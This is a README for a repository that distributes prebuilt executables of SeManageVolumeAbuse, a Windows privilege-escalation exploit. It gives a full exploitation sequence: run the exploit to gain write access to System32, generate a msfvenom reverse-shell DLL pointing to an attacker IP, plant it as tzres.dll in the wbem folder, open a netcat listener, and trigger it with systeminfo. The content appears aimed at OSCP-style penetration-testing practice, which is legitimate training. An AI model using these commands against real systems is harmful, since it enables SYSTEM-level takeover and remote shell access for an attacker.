# SeManageVolumeAbuse

Credit goes to xct <3. this is the main repo : [https://github.com/xct/SeRestoreAbuse](https://github.com/xct/SeManageVolumeAbuse)

This repo is just to have the prebuilt compiled exes to avoid manual compilation.



SeManageVolumeAbuse Get full control over C:\ when the user has SeManageVolumePrivilege (allowing to read/write any files). One possible way to get a shell from here is to write a custom dll to C:\Windows\System32\wbem\tzres.dll & call systeminfo to trigger it.

Credits:
- https://twitter.com/0gtweet/status/1303427935647531018
- https://github.com/gtworek/PSBits/blob/master/Misc/FSCTL_SD_GLOBAL_CHANGE.c

## Example of exploitation

Execute the exploit to gain write privileges to C:\Windows\System32\:

```
.\SeManageVolumeExploit.exe
```

Create a malicious DLL payload with msfvenom:

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=[IP-ADDRESS] LPORT=1337 -f dll -o tzres.dll
```

Place the malicious DLL in the WBEM directory:

```
copy tzres.dll C:\Windows\System32\wbem\
```

Set up a Netcat listener on the attacking machine:

```
rlwrap -cAr nc -lnvp 1337`
```

Activate the payload by running:

```
systeminfo
```

OSCP machine Access, my walkthrough: https://amandaguglieri.github.io/hackinglife/oscp-access/?h=
